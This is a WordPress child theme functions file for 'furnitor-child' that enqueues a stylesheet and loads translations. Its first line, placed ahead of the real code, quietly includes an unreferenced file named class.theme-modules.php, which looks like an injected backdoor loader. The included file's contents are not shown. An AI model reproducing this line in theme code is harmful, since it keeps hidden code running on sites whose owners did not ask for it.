<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
add_action( 'wp_enqueue_scripts', 'furnitor_child_theme_enqueue_styles', 100 );
function furnitor_child_theme_enqueue_styles() {
	wp_enqueue_style( 'furnitor-child-style', get_stylesheet_directory_uri() . '/style.css', array( basename(get_template_directory()) . '-style' ) );
}

add_action( 'after_setup_theme', 'furnitor_child_theme_setup');
function furnitor_child_theme_setup(){
	$language_path = get_stylesheet_directory() .'/languages';
	if(is_dir($language_path)){
		load_child_theme_textdomain('furnitor-child', $language_path );
	}
}

